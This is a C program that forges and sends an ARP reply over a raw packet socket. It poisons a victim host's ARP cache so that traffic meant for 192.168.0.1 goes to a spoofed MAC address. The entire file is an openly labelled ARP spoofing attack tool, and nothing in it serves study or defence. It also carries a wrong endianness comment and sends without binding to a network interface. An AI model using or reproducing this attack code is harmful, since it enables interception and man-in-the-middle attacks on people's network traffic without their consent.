#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/ethernet.h> // ETH_P_ARP
#include <arpa/inet.h>

int main() {
    unsigned char packet[42];

    // Ethernet
    unsigned char dest_mac[]  = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}; // Broadcast
    unsigned char src_mac[]   = {0xde, 0xad, 0xbe, 0xef, 0xde, 0xad}; // Spoofed MAC

    // ARP
    unsigned char arp_packet[] = {
        0x00, 0x01,                     // Hardware type (Ethernet)
        0x08, 0x00,                     // Protocol type (IPv4)
        0x06,                           // Hardware size
        0x04,                           // Protocol size
        0x00, 0x02,                     // Opcode: ARP Reply
        0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, // Sender MAC (spoofed)
        192, 168, 0, 1,                // Sender IP
        0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, // Target MAC (victim)
        192, 168, 0, 100               // Target IP
    };

    // Construct Ethernet + ARP packet
    memcpy(packet, dest_mac, 6);
    memcpy(packet + 6, src_mac, 6);
    packet[12] = 0x08;  // ARP type (little endian)
    packet[13] = 0x06;
    memcpy(packet + 14, arp_packet, sizeof(arp_packet));

    // Create raw socket
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sockfd < 0) {
        perror("socket");
        return 1;
    }

    // Send packet
    if (send(sockfd, packet, sizeof(packet), 0) < 0) {
        perror("send");
        close(sockfd);
        return 1;
    }

    printf("ARP spoof packet sent successfully.\n");

    close(sockfd);
    return 0;
}
